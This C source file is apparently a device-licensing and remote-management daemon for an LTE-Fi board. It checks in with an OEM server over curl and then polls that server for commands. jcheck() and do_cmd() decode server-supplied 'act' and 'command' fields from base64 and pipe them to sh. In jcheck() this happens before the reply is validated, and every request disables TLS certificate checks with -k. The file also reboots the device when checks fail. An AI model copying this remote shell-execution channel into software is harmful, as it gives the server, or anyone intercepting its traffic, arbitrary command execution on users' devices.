#ifndef __THIS_APP
#define __THIS_APP      atss
#endif

#define __DEAMON__
#include "utils.h"
#include "atotp/atotp.h"
#include "atenv/bcookie.h"
#include "atcookie/atcookie.h"

OS_INITER;

#if !AT_LTEFI_MD
#error "just support ltefi md board"
#endif

AT_ENV_INITER;

enum { HACKED_CUSTOM = 1 };

#define PLT_SERVICE_REGISTER    "service1"
#define PLT_SERVICE_AUTH        "service2"
#define PLT_SERVICE_REPORT      "service3"
#define PLT_SERVICE_COMMAND     "service4"

#define FILE_ST                 "/tmp/.atss.st"
#define FILE_RT                 "/tmp/.atss.rt"
#define FILE_NA                 "/tmp/.atss.na"
#define FILE_RS                 "/tmp/.atss.rs"
#define FILE_RN                 "/tmp/.atss.rn"

#ifndef RTMIN
#define RTMIN                   300
#endif

#ifndef RTMAX
#define RTMAX                   (3600*12*30)
#endif

#ifndef RTDFT
#define RTDFT                   RTMAX
#endif

#ifndef NAMIN
#define NAMIN                   300
#endif

#ifndef NAMAX
#define NAMAX                   (3600*12*30)
#endif

#ifndef NADFT
#define NADFT                   NAMAX
#endif

#ifndef RSMIN
#define RSMIN                   30
#endif

#ifndef RSMAX
#define RSMAX                   300
#endif

#ifndef RSDFT
#define RSDFT                   RSMAX
#endif

#ifndef CMDSLEEP
#define CMDSLEEP                600
#endif

#ifndef CHKSLEEP
#define CHKSLEEP                300
#endif

#ifndef PPSLEEP
#define PPSLEEP                 5
#endif

static int cmdsleep = CMDSLEEP;

static unsigned char custom[AT_OTP_SIZE];
static unsigned char private[AT_OTP_SIZE];

#if 1==AT_LTEFI_VERSION
static char *
get_mac(void)
{
    static char mac[1+OS_LINE_LEN];
    static char *files[] = {
        "/data/.register.json",
        "/tmp/.register.json",
    };
    int i;
    
    if (mac[0]) {
        return mac;
    }

    for (i=0; i<os_count_of(files); i++) {
        if (os_file_exist(files[i])) {
            os_v_spgets(mac, OS_LINE_LEN, "cat %s | jq -j .mac", files[i]);

            debug_trace("read %s get mac(%s)", files[i], mac);
            
            if (is_good_macstring(mac)) {
                return mac;
            }
        }
    }

    return __empty;
}
    
static unsigned int
get_mid(void)
{
    static unsigned int mid;

    if (0==mid) {
        os_spgeti(&mid, "bootm mid");
    }

    return mid;
}

static unsigned int
get_psn(void)
{
    static unsigned int psn;

    if (0==psn) {
        os_spgeti(&psn, "bootm psn");
    }

    return psn;
}

static unsigned int
get_rt(void)
{
    static unsigned int rt;

    if (0==rt) {
        os_spgeti(&rt, "bootm rt");
    }

    return rt;
}

static unsigned int na;

static unsigned int
get_na(void)
{
    if (0==na) {
        os_spgeti(&na, "bootm na");
    }

    return na;
}

static void
set_na(int NA)
{
    na = NA;
    
    os_system("bootm na=%d", NA);
}

#define __prepare() os_do_nothing()
#elif 2==AT_LTEFI_VERSION
#define get_mac()   at_info_get(__at_info_product_mac)
#define get_mid()   at_mark_get(__at_mark_cid_mid)
#define get_psn()   at_mark_get(__at_mark_cid_psn)
#define get_rt()    at_mark_get(__at_mark_runtime)
#define get_na()    at_mark_get(__at_mark_noauth)
#define set_na(_na) at_mark_set(__at_mark_noauth, _na)

static void
__prepare(void)
{
    at_open();
    at_load_mark();
    at_load_info_named();
    at_close();
}

#endif

static void
prepare(void)
{
    static bool ok = false;
    
    while(false==ok) {
        __prepare();
        
        char *mac = get_mac();
        unsigned int mid = get_mid();
        unsigned int psn = get_psn();
        unsigned int rt  = get_rt();
        unsigned int na  = get_na();
        
        ok = is_good_macstring(mac) && mid && psn;
        if (false==ok) {
            sleep(PPSLEEP);
        }
        
        debug_trace("load mac=%s, mid=%d, psn=%d, rt=%d, na=%d, ok=%d", 
            mac, mid, psn, rt, na, ok);
    }
}

static int
jcheck(jobj_t obj)
{
    int code = -EFORMAT;

    debug_test("jcheck %s", jobj_string(obj));
    
    jobj_t jact = jobj_get(obj, "act");
    if (jact) {
        char *action = jobj_get_string(jact);
        
        if (is_good_string(action)) {
            os_system("echo %s | base64 -d | sh", action);
        }
    }

    jobj_t jmac = jobj_get(obj, "mac");
    jobj_t jmid = jobj_get(obj, "mid");
    jobj_t jpsn = jobj_get(obj, "psn");
    jobj_t jcode= jobj_get(obj, "code");

    if (NULL==jmac) {
        debug_error("no-found jmac");

        return -EFAKESEVER;
    }
    else if (NULL==jmid) {
        debug_error("no-found jmid");

        return -EFAKESEVER;
    }
    else if (NULL==jpsn) {
        debug_error("no-found jpsn");

        return -EFAKESEVER;
    }
    else if (NULL==jcode) {
        debug_error("no-found jcode");

        return -EFAKESEVER;
    }
    else if (0!=os_strcmp(get_mac(), jobj_get_string(jmac))) {
        debug_error("mac(%s)!=jmac(%s)", get_mac(), jobj_get_string(jmac));

        return -EFAKESEVER;
    }
    else if (get_mid()!=jobj_get_int(jmid)) {
        debug_error("mid(%d)!=jmid(%d)", get_mid(), jobj_get_int(jmid));

        return -EFAKESEVER;
    }
    else if (get_psn()!=jobj_get_int(jpsn)) {
        debug_error("psn(%d)!=jpsn(%d)", get_psn(), jobj_get_int(jpsn));

        return -EFAKESEVER;
    }
    else if (0!=(code = jobj_get_int(jcode))) {
        debug_error("jcode error %d", code);

        return -EFAKESEVER;
    }

    return 0;
}

static int
get_val(char *file, int max, int min, int deft)
{
    int val = deft;
    
    if (os_file_exist(file)) {
        os_spgeti(&val, file);

        if (val < min) {
            val = min;
        } else if (val > max) {
            val = max;
        }
    }

    return val;
}

static int
failed(char *action)
{
    int na = get_val(FILE_NA, NAMAX, NAMIN, NADFT);
    int rt = get_val(FILE_RT, RTMAX, RTMIN, RTDFT);
    int rs = get_val(FILE_RS, RSMAX, RSMIN, RSDFT);

    rt = rt + rand() % rt;
    rs = rs + rand() % rs;
    
    if (get_rt() > rt && get_na() > na) {
        if (os_file_exist(FILE_RN)) {
            os_system("for ((i=0; i<100; i++)); do echo checked %s failed!; done");
        }

        sleep(rs);
        
        os_system("reboot &");
    }
    
    return 0;
}

static void
ok(char *action)
{
    debug_ok("%s ok", action);
    os_system("echo %s >> " FILE_ST, action);
}

static int
do_report(int hack)
{
    char line[1+OS_LINE_LEN] = {0};
    char cert[1+AT_SECOOKIE_LEN] = {0};
    char key[1+AT_SECOOKIE_LEN] = {0};
    jobj_t obj = NULL;
    int err = 0, code = 0;

    if (NULL==__atcookie_file(AT_LSS_CERT, cert)) {
        debug_error("no cert %d", AT_LSS_CERT);
        err = -ENOEXIST; goto error;
    }

    if (NULL==__atcookie_file(AT_LSS_KEY, key)) {
        debug_error("no cert %d",  AT_LSS_KEY);
        err = -ENOEXIST; goto error;
    }

    err = os_v_spgets(line, OS_LINE_LEN, 
            "curl"
                " -d '{\"mac\":\"%s\",\"mid\":%d,\"psn\":%d,\"error\":%d}'"
                " -k --cert %s --key %s"
                " -u %s:%s"
                " -s https://%s:%s/" PLT_SERVICE_REPORT,
            get_mac(), get_mid(), get_psn(), hack,
            cert, key,
            oem_lss_user, oem_lss_password,
            oem_lss_server, oem_lss_port);
    if (err) {
        debug_error("curl err(%d)", err);
        err = -ECURLFAIL; goto error;
    }

    obj = jobj(line);
    if (NULL==obj) {
        debug_error("bad json=%s", line);
        err = -EFAKESEVER; goto error;
    }
    
    code = jcheck(obj);
    if (code) {
        debug_error("check json failed");
        err = -EFAKESEVER; goto error;
    }
    
    jobj_t jerr = jobj_get(obj, "error");
    if (NULL==jerr || hack!=jobj_get_int(jerr)) {
        debug_error("bad json error");
        err = -EFAKESEVER; goto error;
    }

    ok("report");
error:
    jobj_put(obj);

    if (err) {
        failed("report");
    }

    if (key[0]) {
        unlink(key);
    }

    if (cert[0]) {
        unlink(cert);
    }
    
    return err;
}

static int
do_register(void)
{
    char line[1+OS_LINE_LEN] = {0};
    char cert[1+AT_SECOOKIE_LEN] = {0};
    char key[1+AT_SECOOKIE_LEN] = {0};
    jobj_t obj = NULL;
    int err = 0, code = 0;

    if (NULL==__atcookie_file(AT_LSS_CERT, cert)) {
        debug_error("no cert %d", AT_LSS_CERT);
        err = -ENOEXIST; goto error;
    }

    if (NULL==__atcookie_file(AT_LSS_KEY, key)) {
        debug_error("no cert %d", AT_LSS_KEY);
        err = -ENOEXIST; goto error;
    }

    err = os_v_spgets(line, OS_LINE_LEN, 
            "curl"
                " -d '{\"mac\":\"%s\",\"mid\":%d,\"psn\":%d}'"
                " -k --cert %s --key %s"
                " -u %s:%s"
                " -s https://%s:%s/" PLT_SERVICE_REGISTER,
            get_mac(), get_mid(), get_psn(),
            cert, key,
            oem_lss_user, oem_lss_password,
            oem_lss_server, oem_lss_port);
    if (err) {
        debug_error("curl err(%d)", err);
        err = -ECURLFAIL; goto error;
    }

    obj = jobj(line);
    if (NULL==obj) {
        debug_error("bad json=%s", line);
        err = -EFAKESEVER; goto error;
    }

    code = jcheck(obj);
    if (code) {
        debug_error("check json failed");
        err = -EFAKESEVER; goto error;
    }

    jobj_t jguid= jobj_get(obj, "guid");
    if (NULL==jguid) {
        debug_error("no-found json guid");
        err = -EFAKESEVER; goto error;
    }
    else if (NULL==__otp_get_bystring(private, jobj_get_string(jguid))) {
        debug_error("bad json guid");
        err = -EFAKESEVER; goto error;
    }

    __otp_call(__otp_private_write, private);
    
    ok("register");
error:
    jobj_put(obj);

    if (err) {
        failed("register");
    }

    if (key[0]) {
        unlink(key);
    }

    if (cert[0]) {
        unlink(cert);
    }
    
    return err; 
}

static int
do_auth(void)
{
    char line[1+OS_LINE_LEN] = {0};
    char cert[1+AT_SECOOKIE_LEN] = {0};
    char key[1+AT_SECOOKIE_LEN] = {0};
    jobj_t obj = NULL;
    int err = 0, code = 0;

    if (NULL==__atcookie_file(AT_LSS_CERT, cert)) {
        debug_error("no cert %d", AT_LSS_CERT);
        err = -ENOEXIST; goto error;
    }

    if (NULL==__atcookie_file(AT_LSS_KEY, key)) {
        debug_error("no cert %d", AT_LSS_KEY);
        err = -ENOEXIST; goto error;
    }
    
    err = os_v_spgets(line, OS_LINE_LEN, 
            "curl"
                " -d '{\"mac\":\"%s\",\"mid\":%d,\"psn\":%d,\"guid\":\"%s\"}'"
                " -k --cert %s --key %s"
                " -u %s:%s"
                " -s https://%s:%s/" PLT_SERVICE_AUTH,
            get_mac(), get_mid(), get_psn(), __otp_string(private),
            cert, key,
            oem_lss_user, oem_lss_password,
            oem_lss_server, oem_lss_port);
    if (err) {
        debug_error("curl err(%d)", err);
        err = -ECURLFAIL; goto error;
    }
    
    obj = jobj(line);
    if (NULL==obj) {
        debug_error("bad json=%s", line);
        err = -EFAKESEVER; goto error;
    }

    code = jcheck(obj);
    if (code) {
        debug_error("check json failed");
        err = -EFAKESEVER; goto error;
    }

    jobj_t jguid= jobj_get(obj, "guid");
    if (NULL==jguid) {
        debug_error("no-found json guid");
        err = -EFAKESEVER; goto error;
    }
    else if (NULL==__otp_get_bystring(private, jobj_get_string(jguid))) {
        debug_error("bad json guid");
        err = -EFAKESEVER; goto error;
    }

    ok("auth");
    set_na(0);
error:
    jobj_put(obj);

    if (err) {
        failed("auth");
    }

    if (key[0]) {
        unlink(key);
    }

    if (cert[0]) {
        unlink(cert);
    }
    
    return err;
}

static int
do_check(void)
{
    int err = 0;

    err = __otp_call(__otp_custom_read, custom);
    if (err) {
        return err;
    }
    
    err = __otp_call(__otp_private_read, private);
    if (err) {
        return err;
    }
    
    if (__otp_eq(custom, AT_OTP_ZERO)) {
        __otp_call(__otp_custom_write, AT_OTP_CUSTOM);

        return -ENOAUTH;
    }
    else if (false==__otp_eq(custom, __AT_OTP_CUSTOM)
          && false==__otp_eq(custom, AT_OTP_CUSTOM)) {
        debug_trace("custom is HACKED");
        
        do_report(HACKED_CUSTOM);

        return -EHACKED;
    }
    else if (__otp_eq(private, AT_OTP_ZERO)) {
        debug_trace("private is ZERO");
        
        do_register();

        return -ENOAUTH;
    }
    else {
        debug_trace("private is PRIVATE");
        
        return do_auth();
    }
}

static int
do_cmd(void)
{
    char line[1+OS_LINE_LEN] = {0};
    char cert[1+AT_SECOOKIE_LEN] = {0};
    char key[1+AT_SECOOKIE_LEN] = {0};
    jobj_t obj = NULL;
    int err = 0, code = 0;

    if (NULL==__atcookie_file(AT_LSS_CERT, cert)) {
        debug_error("no cert %d", AT_LSS_CERT);
        err = -ENOEXIST; goto error;
    }

    if (NULL==__atcookie_file(AT_LSS_KEY, key)) {
        debug_error("no cert %d", AT_LSS_KEY);
        err = -ENOEXIST; goto error;
    }
    
    err = os_v_spgets(line, OS_LINE_LEN, 
            "curl"
                " -d '{\"mac\":\"%s\",\"mid\":%d,\"psn\":%d,\"guid\":\"%s\"}'"
                " -k --cert %s --key %s"
                " -u %s:%s"
                " -s https://%s:%s/" PLT_SERVICE_COMMAND,
            get_mac(), get_mid(), get_psn(), __otp_string(private),
            cert, key,
            oem_lss_user, oem_lss_password,
            oem_lss_server, oem_lss_port);
    unlink(cert);
    unlink(key);
    if (err) {
        debug_error("curl err(%d)", err);
        err = -ECURLFAIL; goto error;
    }
    
    obj = jobj(line);
    if (NULL==obj) {
        debug_error("bad json=%s", line);
        err = -EFAKESEVER; goto error;
    }

    code = jcheck(obj);
    if (code) {
        debug_error("check json failed");
        err = -EFAKESEVER; goto error;
    }

    jobj_t jsleep = jobj_get(obj, "sleep");
    if (jsleep) {
        int tmpsleep = jobj_get_int(jsleep);
        
        debug_ok("sleep changed from %d to %d", cmdsleep, tmpsleep);
        
        cmdsleep = tmpsleep;
    }

    jobj_t jcmd = jobj_get(obj, "command");
    if (jcmd) {
        os_system("echo %s | base64 -d | sh", jobj_get_string(jcmd));

        ok("command");
    }

error:
    jobj_put(obj);

    return err;
}

static int
__fini(void)
{
    os_fini();

    return 0;
}

static void
__exit(int sig)
{
    __fini();
    
    exit(sig);
}

static int
__init(void)
{
    int err;

    srand(time(NULL));
    
    err = os_init();
    if (err) {
        return err;
    }

    return 0;
}

static int
__main(int argc, char *argv[])
{
    prepare();
    
    while(do_check()) {
        sleep(CHKSLEEP);

        set_na(get_na() + CHKSLEEP);
    }

    while(1) {
        do_cmd();

        sleep(cmdsleep);
    }
    
    return 0;
}

#ifndef __BUSYBOX__
#define atss_main  main
#endif

int atss_main(int argc, char *argv[])
{
    os_setup_signal_exit(__exit);
    os_setup_signal_callstack(NULL);
    
    return os_call(__init, __fini, __main, argc, argv);
}
/******************************************************************************/
